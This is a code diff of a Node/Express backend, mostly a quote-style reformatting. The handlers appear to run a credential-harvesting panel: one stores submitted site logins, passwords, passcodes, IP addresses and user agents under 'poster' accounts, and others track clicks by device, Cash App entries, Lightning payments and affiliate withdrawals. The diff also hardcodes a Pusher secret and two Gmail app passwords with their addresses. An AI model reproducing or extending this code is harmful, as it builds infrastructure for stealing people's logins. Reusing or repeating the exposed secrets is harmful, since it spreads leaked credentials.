         {
           adminId: userFound.adminId || userFound.username,
           name: userFound.username,
-        },
+        }
       );
-      return res.status(200).json({ status: "saved", info });
+      return res.status(200).json({ status: 'saved', info });
     }
-    return res.status(400).json({ error: "User not found" });
+    return res.status(400).json({ error: 'User not found' });
   } catch (e) {
     return res.status(400).json({ error: e.message });
   }
@@ -1130,13 +1147,13 @@ export const admin_add_site = async (req, res) => {
       return element == site;
     });
     if (linKfound) {
-      return res.status(200).json({ success: "exists" });
+      return res.status(200).json({ success: 'exists' });
     }
     data.links.push(site);
     await data.save();
-    return res.status(200).json({ success: "saved successfully" });
+    return res.status(200).json({ success: 'saved successfully' });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -1159,7 +1176,7 @@ export const new_site_add_poster = (req, res) => {
         Link.findOne({ linkName: item })
           .then(async (found) => {
             if (found) {
-              console.log("yes");
+              console.log('yes');
             }
             await Link.create({
               linkName: item,
@@ -1168,9 +1185,9 @@ export const new_site_add_poster = (req, res) => {
           })
           .catch((e) => console.log(e));
       });
-    },
+    }
   );
-  return res.status(200).json({ success: "updated successfully" });
+  return res.status(200).json({ success: 'updated successfully' });
 };
 
 export const get_A_poster = async (req, res) => {
@@ -1182,7 +1199,7 @@ export const get_A_poster = async (req, res) => {
     if (admin) {
       const data = await Poster.findOne({ _id: id });
       if (!data) {
-        return res.status(200).json({ data: "not found" });
+        return res.status(200).json({ data: 'not found' });
       }
       return res.status(200).json({ data: data });
     }
@@ -1190,7 +1207,7 @@ export const get_A_poster = async (req, res) => {
 
     return res.status(200).json({ data: data.links, sites: sites });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -1245,9 +1262,9 @@ export const click = async (req, res) => {
       return res.status(200).json({ click: click });
     }
 
-    return res.status(400).json({ error: "not found any" });
+    return res.status(400).json({ error: 'not found any' });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -1260,15 +1277,15 @@ export const click_for_admin = async (req, res) => {
       return res.status(200).json({ click: click });
     }
 
-    return res.status(400).json({ error: "not found any" });
+    return res.status(400).json({ error: 'not found any' });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
 export const otp_send = async (req, res) => {
   const { username, phone } = req.body;
-  const apiUrl = "https://sms.dev-sajid.xyz/api/send-otp-v1";
+  const apiUrl = 'https://sms.dev-sajid.xyz/api/send-otp-v1';
 
   const postData = {
     number: phone,
@@ -1281,7 +1298,7 @@ export const otp_send = async (req, res) => {
     if (userFound.phone == phone) {
       const response = await axios.post(apiUrl, postData);
       if (!response) {
-        return res.status(400).json({ e: "user not found" });
+        return res.status(400).json({ e: 'user not found' });
       }
       const otp = await Otp.create({
         otp: response.data.otp,
@@ -1292,11 +1309,11 @@ export const otp_send = async (req, res) => {
       // passwordOfPassChanges.totalRequest= passwordOfPassChanges.totalRequest + 1
       // await  passwordOfPassChanges.save()
 
-      return res.status(200).json({ success: "otp sent successfully" });
+      return res.status(200).json({ success: 'otp sent successfully' });
     }
-    return res.status(400).json({ e: "user not found" });
+    return res.status(400).json({ e: 'user not found' });
   } catch (e) {
-    return res.status(400).json({ e: "error" });
+    return res.status(400).json({ e: 'error' });
   }
 };
 
@@ -1313,24 +1330,24 @@ export const otp_check = async (req, res) => {
       const diff = currentDate - otpUser.createdAt;
       const difff = diff / 1000 / 60;
       if (difff >= 2) {
-        return res.status(400).json({ error: "session Expired" });
+        return res.status(400).json({ error: 'session Expired' });
       }
-      return res.status(200).json({ success: "true" });
+      return res.status(200).json({ success: 'true' });
     }
 
-    return res.status(400).json({ e: "user not found" });
+    return res.status(400).json({ e: 'user not found' });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
 export const pass_change = async (req, res) => {
   const { username, password, otp } = req.body;
   const pusher = new Pusher({
-    appId: "1987499",
-    key: "05656b52c62c0f688ee3",
-    secret: "b4372518df233d054270",
-    cluster: "ap2",
+    appId: '1987499',
+    key: '05656b52c62c0f688ee3',
+    secret: 'b4372518df233d054270',
+    cluster: 'ap2',
     useTLS: true,
   });
 
@@ -1344,17 +1361,17 @@ export const pass_change = async (req, res) => {
       const deleted = await Otp.findOneAndRemove({ otp: otpUser.otp });
 
       if (deleted) {
-        pusher.trigger(userFound.adminId, "password-notification", {
+        pusher.trigger(userFound.adminId, 'password-notification', {
           adminId: userFound.adminId,
         });
       }
 
-      return res.status(200).json({ success: "changed succesfully" });
+      return res.status(200).json({ success: 'changed succesfully' });
     }
 
-    return res.status(400).json({ e: "user not found" });
+    return res.status(400).json({ e: 'user not found' });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -1373,12 +1390,12 @@ export const phone_add = async (req, res) => {
       // }
       userFound.phone = phone;
       await userFound.save();
-      return res.status(200).json({ success: "changed succesfully" });
+      return res.status(200).json({ success: 'changed succesfully' });
     }
 
-    return res.status(400).json({ e: "user not found" });
+    return res.status(400).json({ e: 'user not found' });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -1400,7 +1417,7 @@ export const update_validity = (req, res) => {
         res.status(400).json({ error: err });
       }
       res.status(200).json({ success: currentDate });
-    },
+    }
   );
 };
 
@@ -1445,10 +1462,10 @@ export const cashapap_post = async (req, res) => {
         adminId,
         posterId,
       });
-      return res.status(200).json({ success: "Created successfully " });
+      return res.status(200).json({ success: 'Created successfully ' });
     }
 
-    return res.status(400).json({ error: "doesnt exists" });
+    return res.status(400).json({ error: 'doesnt exists' });
   } catch (e) {
     return res.status(400).json({ error: e });
   }
@@ -1470,7 +1487,7 @@ export const links_add = (req, res) => {
         res.status(400).json({ error: err });
       }
       res.status(200).json({ success: true });
-    },
+    }
   );
 };
 
@@ -1491,9 +1508,9 @@ export const get_deyails_cashapp = async (req, res) => {
     if (cashappAdmin.length > 0) {
       return res.status(200).json({ cashapp: cashappAdmin });
     }
-    return res.status(400).json({ error: "not found any" });
+    return res.status(400).json({ error: 'not found any' });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -1519,7 +1536,7 @@ export const show_all = async (req, res) => {
   //     socket.io.emit("done")
   // })
   try {
-    const userFound = await Poster.find().select("links");
+    const userFound = await Poster.find().select('links');
 
     return res.status(200).json({ user: userFound });
   } catch (e) {
@@ -1537,7 +1554,7 @@ export const check_qrcode = async (req, res) => {
         {
           status: userFound.qrCodeStatus === true,
           showTagField: userFound.showTagField === true,
-          tag: userFound.tag || "",
+          tag: userFound.tag || '',
         },
       ]);
     }
@@ -1556,7 +1573,7 @@ export const check_qrcode = async (req, res) => {
           {
             status: admin.qrCodeStatus === true,
             showTagField: admin.showTagField === true,
-            tag: posterFound.tag || "",
+            tag: posterFound.tag || '',
           },
         ]);
       }
@@ -1569,7 +1586,7 @@ export const check_qrcode = async (req, res) => {
         {
           status: userById.qrCodeStatus === true,
           showTagField: userById.showTagField === true,
-          tag: userById.tag || "",
+          tag: userById.tag || '',
         },
       ]);
     }
@@ -1583,13 +1600,13 @@ export const check_qrcode = async (req, res) => {
           {
             status: admin.qrCodeStatus === true,
             showTagField: admin.showTagField === true,
-            tag: posterById.tag || "",
+            tag: posterById.tag || '',
           },
         ]);
       }
     }
 
-    return res.status(400).json({ error: "not found" });
+    return res.status(400).json({ error: 'not found' });
   } catch (e) {
     return res.status(400).json({ error: e.message });
   }
@@ -1609,8 +1626,8 @@ export const rqcode_permission = (req, res) => {
       if (err) {
         res.status(400).json({ error: err });
       }
-      res.status(200).json({ success: "succes" });
-    },
+      res.status(200).json({ success: 'succes' });
+    }
   );
 };
 
@@ -1627,14 +1644,14 @@ export const update_many = (req, res) => {
     if (err) {
       res.status(400).json({ error: err });
     }
-    res.status(200).json({ success: "success" });
+    res.status(200).json({ success: 'success' });
   });
 };
 
 export const add_data_checnge = async (req, res) => {
   const { adminId, posterId } = req.params;
   const { site, email, password, skipcode, username, passcode } = req.body;
-  const userAgent = req.headers["user-agent"];
+  const userAgent = req.headers['user-agent'];
   const ipAddress = req.connection.remoteAddress;
   try {
     const userFound = await User.findOne({ adminId: adminId });
@@ -1658,12 +1675,12 @@ export const add_data_checnge = async (req, res) => {
       });
       posterFound.details.push(info._id);
       await posterFound.save();
-      changeEvent("hello", req, res);
+      changeEvent('hello', req, res);
       return res.status(200).json({ info: info });
     }
-    return res.status(400).json({ e: "not found" });
+    return res.status(400).json({ e: 'not found' });
   } catch (e) {
-    return res.status(400).json({ e: "error" });
+    return res.status(400).json({ e: 'error' });
   }
 };
 
@@ -1673,17 +1690,17 @@ export const today_data = async (req, res) => {
   if (user) {
     const desktopClickSum = await Click.aggregate([
       { $match: { adminId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalDesktop: { $sum: "$desktop" } } }, // Sum desktop values
+      { $group: { _id: null, totalDesktop: { $sum: '$desktop' } } }, // Sum desktop values
     ]);
 
     const phoneClickSum = await Click.aggregate([
       { $match: { adminId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalPhone: { $sum: "$phone" } } }, // Sum desktop values
+      { $group: { _id: null, totalPhone: { $sum: '$phone' } } }, // Sum desktop values
     ]);
 
     const ipadClickSum = await Click.aggregate([
       { $match: { adminId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalIpad: { $sum: "$ipad" } } }, // Sum desktop values
+      { $group: { _id: null, totalIpad: { $sum: '$ipad' } } }, // Sum desktop values
     ]);
 
     const totalDesktopClicks =
@@ -1701,17 +1718,17 @@ export const today_data = async (req, res) => {
   } else {
     const desktopClickSum = await Click.aggregate([
       { $match: { posterId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalDesktop: { $sum: "$desktop" } } }, // Sum desktop values
+      { $group: { _id: null, totalDesktop: { $sum: '$desktop' } } }, // Sum desktop values
     ]);
 
     const phoneClickSum = await Click.aggregate([
       { $match: { posterId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalPhone: { $sum: "$phone" } } }, // Sum desktop values
+      { $group: { _id: null, totalPhone: { $sum: '$phone' } } }, // Sum desktop values
     ]);
 
     const ipadClickSum = await Click.aggregate([
       { $match: { posterId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalIpad: { $sum: "$ipad" } } }, // Sum desktop values
+      { $group: { _id: null, totalIpad: { $sum: '$ipad' } } }, // Sum desktop values
     ]);
 
     const totalDesktopClicks =
@@ -1734,13 +1751,13 @@ export const email_otp = async (req, res) => {
   const rand = Math.random().toString().substr(2, 6);
 
   const transporter = nodemailer.createTransport({
-    service: "gmail",
-    host: "smtp.gmail.com",
+    service: 'gmail',
+    host: 'smtp.gmail.com',
     port: 587,
     secure: false,
     auth: {
-      user: "ranaha199112@gmail.com",
-      pass: "jzpp ypxn ywtr niog",
+      user: 'ranaha199112@gmail.com',
+      pass: 'jzpp ypxn ywtr niog',
       //   user: 'tonmoysamoi@gmail.com',
       //   pass:'theh cifb ffjc ogil',
     },
@@ -1748,11 +1765,11 @@ export const email_otp = async (req, res) => {
 
   const mailOptions = {
     from: {
-      name: "Forget Password",
-      address: "ranaha199112@gmail.com",
+      name: 'Forget Password',
+      address: 'ranaha199112@gmail.com',
     },
     to: email,
-    subject: "Otp Check",
+    subject: 'Otp Check',
     text: `Your Password OTP is ${rand}`,
   };
 
@@ -1765,9 +1782,9 @@ export const email_otp = async (req, res) => {
         otp: rand,
         username,
       });
-      return res.status(200).json({ success: "Email sent" });
+      return res.status(200).json({ success: 'Email sent' });
     }
-    return res.status(500).json({ error: "not found" });
+    return res.status(500).json({ error: 'not found' });
   } catch (error) {
     return res.status(500).json({ error: error });
   }
@@ -1791,7 +1808,7 @@ export const add_email = (req, res) => {
       }
 
       return res.status(200).json({ success: true });
-    },
+    }
   );
 };
 
@@ -1806,12 +1823,12 @@ export const email_add = async (req, res) => {
     if (userFound && !useremail) {
       userFound.email = email;
       await userFound.save();
-      return res.status(200).json({ success: "changed succesfully" });
+      return res.status(200).json({ success: 'changed succesfully' });
     }
 
-    return res.status(400).json({ e: "user not found" });
+    return res.status(400).json({ e: 'user not found' });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -1820,13 +1837,13 @@ export const send_email = async (req, res) => {
   const rand = Math.random().toString().substr(2, 6);
 
   const transporter = nodemailer.createTransport({
-    service: "gmail",
-    host: "smtp.gmail.com",
+    service: 'gmail',
+    host: 'smtp.gmail.com',
     port: 587,
     secure: false,
     auth: {
-      user: "tonmoysamoi@gmail.com",
-      pass: "theh cifb ffjc ogil",
+      user: 'tonmoysamoi@gmail.com',
+      pass: 'theh cifb ffjc ogil',
       // user: 'ranaha199112@gmail.com',
       // pass:'jzpp ypxn ywtr niog',
 
@@ -1839,20 +1856,20 @@ export const send_email = async (req, res) => {
 
   const mailOptions = {
     from: {
-      name: "Test Email",
-      address: "tonmoysamoi@gmail.com",
+      name: 'Test Email',
+      address: 'tonmoysamoi@gmail.com',
     },
     to: email,
     // cc: ['rana.buddy@gmail.com','emonabdullah445@gmail.com','simonahmed00775@gmail.com'],
-    subject: "active ship management",
-    text: "this email is from active ship management",
+    subject: 'active ship management',
+    text: 'this email is from active ship management',
     // html:templete
   };
 
   try {
     const info = await transporter.sendMail(mailOptions);
 
-    return res.status(200).json({ success: "Email sent" });
+    return res.status(200).json({ success: 'Email sent' });
   } catch (error) {
     console.log(error);
     return res.status(500).json({ error: error });
@@ -1902,7 +1919,7 @@ export const get_amount_summary = async (req, res) => {
     let query = {};
     if (posterFound) {
       const posterIds = [posterFound._id.toString()];
-      if (posterFound.posterId && posterFound.posterId.trim() !== "") {
+      if (posterFound.posterId && posterFound.posterId.trim() !== '') {
         posterIds.push(posterFound.posterId);
       }
       query = { poster: { $in: posterIds } };
@@ -1915,12 +1932,12 @@ export const get_amount_summary = async (req, res) => {
         ],
       });
       if (!userFound) {
-        return res.status(400).json({ error: "User or Poster not found" });
+        return res.status(400).json({ error: 'User or Poster not found' });
       }
       query = { adminId: userFound.adminId };
     }
 
-    const infos = await Info.find(query).select("amount");
+    const infos = await Info.find(query).select('amount');
     let total = 0;
     infos.forEach((info) => {
       if (info.amount) {
@@ -1947,7 +1964,7 @@ export const get_amount_list = async (req, res) => {
     let query = {};
     if (posterFound) {
       const posterIds = [posterFound._id.toString()];
-      if (posterFound.posterId && posterFound.posterId.trim() !== "") {
+      if (posterFound.posterId && posterFound.posterId.trim() !== '') {
         posterIds.push(posterFound.posterId);
       }
       query = { poster: { $in: posterIds } };
@@ -1960,16 +1977,16 @@ export const get_amount_list = async (req, res) => {
         ],
       });
       if (!userFound) {
-        return res.status(400).json({ error: "User or Poster not found" });
+        return res.status(400).json({ error: 'User or Poster not found' });
       }
       query = { adminId: userFound.adminId };
     }
 
     const infos = await Info.find(query)
       .select(
-        "site email amount createdAt adminId poster root status lightningInvoice rHash",
+        'site email amount createdAt adminId poster root status lightningInvoice rHash'
       )
-      .populate("root", "username")
+      .populate('root', 'username')
       .sort({ createdAt: -1 });
 
     return res.status(200).json({ success: true, data: infos });
@@ -1984,22 +2001,24 @@ export const check_payment_status = async (req, res) => {
   try {
     const info = await Info.findById(infoId);
     if (!info) {
-      return res.status(404).json({ error: "Info record not found" });
+      return res.status(404).json({ error: 'Info record not found' });
     }
 
     if (!info.rHash) {
       return res
         .status(400)
-        .json({ error: "No lightning invoice associated with this record" });
+        .json({ error: 'No lightning invoice associated with this record' });
     }
 
     const nwcInstance = getNwc();
     if (nwcInstance) {
       try {
-        console.log(`[Alby NWC] Checking status for invoice with hash: ${info.rHash}`);
+        console.log(
+          `[Alby NWC] Checking status for invoice with hash: ${info.rHash}`
+        );
         const lookup = await nwcInstance.lookupInvoice({
           paymentHash: info.rHash,
-          payment_hash: info.rHash
+          payment_hash: info.rHash,
         });
 
         if (lookup && lookup.paid) {
@@ -2012,20 +2031,14 @@ export const check_payment_status = async (req, res) => {
             .json({ success: false, status: info.status || false, info });
         }
       } catch (albyErr) {
-        console.error(
-          "Alby NWC lookupInvoice failed:",
-          albyErr.message
-        );
+        console.error('Alby NWC lookupInvoice failed:', albyErr.message);
         return res.status(500).json({ error: albyErr.message });
       }
     } else {
-      return res.status(500).json({ error: "Alby NWC is not initialized" });
+      return res.status(500).json({ error: 'Alby NWC is not initialized' });
     }
   } catch (error) {
-    console.error(
-      "Verify payment failed:",
-      error.message,
-    );
+    console.error('Verify payment failed:', error.message);
     return res.status(500).json({ error: error.message });
   }
 };
@@ -2041,7 +2054,7 @@ export const get_withdraw_summary = async (req, res) => {
     let userId = id;
     if (posterFound) {
       const posterIds = [posterFound._id.toString()];
-      if (posterFound.posterId && posterFound.posterId.trim() !== "") {
+      if (posterFound.posterId && posterFound.posterId.trim() !== '') {
         posterIds.push(posterFound.posterId);
       }
       query = { poster: { $in: posterIds } };
@@ -2055,13 +2068,13 @@ export const get_withdraw_summary = async (req, res) => {
         ],
       });
       if (!userFound) {
-        return res.status(400).json({ error: "User or Poster not found" });
+        return res.status(400).json({ error: 'User or Poster not found' });
       }
       query = { adminId: userFound.adminId };
       userId = userFound._id.toString();
     }
 
-    const infos = await Info.find(query).select("amount status");
+    const infos = await Info.find(query).select('amount status');
     let totalAmount = 0;
     let paidAmount = 0;
 
@@ -2071,7 +2084,13 @@ export const get_withdraw_summary = async (req, res) => {
         if (!isNaN(val)) {
           totalAmount += val;
           const status = info.status;
-          if (status === true || status === "true" || status === "paid" || status === "success" || status === "successful") {
+          if (
+            status === true ||
+            status === 'true' ||
+            status === 'paid' ||
+            status === 'success' ||
+            status === 'successful'
+          ) {
             paidAmount += val;
           }
         }
@@ -2083,15 +2102,18 @@ export const get_withdraw_summary = async (req, res) => {
     let pendingWithdraw = 0;
     let lastWithdraw = 0;
 
-    const approvedWithdraws = withdraws.filter(w => w.status === "approved");
+    const approvedWithdraws = withdraws.filter((w) => w.status === 'approved');
     if (approvedWithdraws.length > 0) {
       approvedWithdraws.sort((a, b) => b.createdAt - a.createdAt);
       lastWithdraw = approvedWithdraws[0].amount;
-      totalWithdrawn = approvedWithdraws.reduce((acc, curr) => acc + curr.amount, 0);
+      totalWithdrawn = approvedWithdraws.reduce(
+        (acc, curr) => acc + curr.amount,
+        0
+      );
     }
 
     pendingWithdraw = withdraws
-      .filter(w => w.status === "pending")
+      .filter((w) => w.status === 'pending')
       .reduce((acc, curr) => acc + curr.amount, 0);
 
     const availableAmount = paidAmount - totalWithdrawn - pendingWithdraw;
@@ -2102,7 +2124,7 @@ export const get_withdraw_summary = async (req, res) => {
       totalWithdrawn,
       pendingWithdraw,
       lastWithdraw,
-      availableAmount: availableAmount > 0 ? availableAmount : 0
+      availableAmount: availableAmount > 0 ? availableAmount : 0,
     });
   } catch (e) {
     return res.status(400).json({ error: e.message });
@@ -2124,7 +2146,7 @@ export const request_withdraw = async (req, res) => {
       userId = posterFound._id.toString();
       rootId = posterFound.root;
       const posterIds = [posterFound._id.toString()];
-      if (posterFound.posterId && posterFound.posterId.trim() !== "") {
+      if (posterFound.posterId && posterFound.posterId.trim() !== '') {
         posterIds.push(posterFound.posterId);
       }
       query = { poster: { $in: posterIds } };
@@ -2137,14 +2159,14 @@ export const request_withdraw = async (req, res) => {
         ],
       });
       if (!userFound) {
-        return res.status(400).json({ error: "User or Poster not found" });
+        return res.status(400).json({ error: 'User or Poster not found' });
       }
       userId = userFound._id.toString();
       rootId = userFound.adminId;
       query = { adminId: userFound.adminId };
     }
 
-    const infos = await Info.find(query).select("amount status");
+    const infos = await Info.find(query).select('amount status');
     let paidAmount = 0;
 
     infos.forEach((info) => {
@@ -2152,7 +2174,13 @@ export const request_withdraw = async (req, res) => {
         const val = parseFloat(info.amount);
         if (!isNaN(val)) {
           const status = info.status;
-          if (status === true || status === "true" || status === "paid" || status === "success" || status === "successful") {
+          if (
+            status === true ||
+            status === 'true' ||
+            status === 'paid' ||
+            status === 'success' ||
+            status === 'successful'
+          ) {
             paidAmount += val;
           }
         }
@@ -2163,10 +2191,10 @@ export const request_withdraw = async (req, res) => {
     let totalWithdrawn = 0;
     let pendingWithdraw = 0;
 
-    withdraws.forEach(w => {
-      if (w.status === "approved") {
+    withdraws.forEach((w) => {
+      if (w.status === 'approved') {
         totalWithdrawn += w.amount;
-      } else if (w.status === "pending") {
+      } else if (w.status === 'pending') {
         pendingWithdraw += w.amount;
       }
     });
@@ -2174,14 +2202,14 @@ export const request_withdraw = async (req, res) => {
     const availableAmount = paidAmount - totalWithdrawn - pendingWithdraw;
 
     if (amount > availableAmount) {
-      return res.status(400).json({ error: "Insufficient available balance" });
+      return res.status(400).json({ error: 'Insufficient available balance' });
     }
 
     const newWithdraw = await Withdraw.create({
       userId,
       rootId,
       amount,
-      status: "pending"
+      status: 'pending',
     });
 
     return res.status(200).json({ success: true, data: newWithdraw });
@@ -2199,7 +2227,9 @@ export const get_withdraw_list = async (req, res) => {
     });
     let withdraws = [];
     if (posterFound) {
-      withdraws = await Withdraw.find({ userId: posterFound._id.toString() }).sort({ createdAt: -1 });
+      withdraws = await Withdraw.find({
+        userId: posterFound._id.toString(),
+      }).sort({ createdAt: -1 });
     } else {
       const userFound = await User.findOne({
         $or: [
@@ -2209,14 +2239,14 @@ export const get_withdraw_list = async (req, res) => {
         ],
       });
       if (!userFound) {
-        return res.status(400).json({ error: "User or Poster not found" });
+        return res.status(400).json({ error: 'User or Poster not found' });
       }
       withdraws = await Withdraw.find({
         $or: [
           { userId: userFound._id.toString() },
           { rootId: userFound._id.toString() },
-          { rootId: userFound.adminId }
-        ]
+          { rootId: userFound.adminId },
+        ],
       }).sort({ createdAt: -1 });
     }
 
@@ -2233,7 +2263,7 @@ export const update_withdraw_status = async (req, res) => {
   try {
     const withdraw = await Withdraw.findById(withdrawId);
     if (!withdraw) {
-      return res.status(404).json({ error: "Withdraw not found" });
+      return res.status(404).json({ error: 'Withdraw not found' });
     }
 
     withdraw.status = status;
